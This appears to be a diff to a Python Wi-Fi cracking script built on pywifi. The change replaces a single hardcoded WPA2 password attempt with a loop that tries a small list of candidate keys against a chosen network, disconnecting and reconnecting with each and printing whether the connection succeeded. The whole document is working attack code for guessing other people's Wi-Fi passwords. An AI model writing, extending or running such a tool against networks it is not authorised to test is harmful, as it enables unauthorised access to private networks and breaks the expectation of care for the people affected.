@@ -35,34 +35,40 @@ def scan_for_in_range_wifi():
     
     crack(wifi_to_crack)
 
+
 def crack(ssid):
+    keys = ['aa112233', 'dwedewfk', '0irf0ewuj', 'eopwkjfp[we', '2098302983', 'root2003']
     iface.disconnect()
     while iface.status() == 4:
         pass
-    profile = pywifi.Profile()
-    profile.ssid = ssid
-    profile.auth = const.AUTH_ALG_OPEN
-    profile.akm.append(const.AKM_TYPE_WPA2PSK)
-    profile.cipher = const.CIPHER_TYPE_CCMP
-    profile.key = 'root2003'
-    iface.remove_all_network_profiles()
-    temp_profile = iface.add_network_profile(profile)
-    iface.connect(temp_profile)
-    start_time = time.time()
-    while True:
-        os.system('cls')
-        if iface.status() == 4:
-            print(f'\r[+] Connected To {ssid} Using root2003', end='')
-            break
-        else:
-            print(f'\r[-] Failed To Connect To {ssid} Using root2003', end='')
-        time.sleep(0.01)
+    for pwd in keys:
+        profile = pywifi.Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        profile.key = pwd
+        iface.remove_all_network_profiles()
+        temp_profile = iface.add_network_profile(profile)
+        iface.connect(temp_profile)
+        check_times = 2
+        while check_times:
+            os.system('cls')
+            if iface.status() == 4:
+                print(f'[+] Connected To {ssid} Using {pwd}')
+                time.sleep(0.1)
+            else:
+                print(f'[-] Failed To Connect To {ssid} Using {pwd}')
+                time.sleep(0.1)
+            check_times -= 1
+
 
 def main():
     global pywifi_obj, iface
     pywifi_obj = pywifi.PyWiFi()
     iface = pywifi_obj.interfaces()[0]
     scan_for_in_range_wifi()
+
 
 if __name__ == '__main__':
     main()
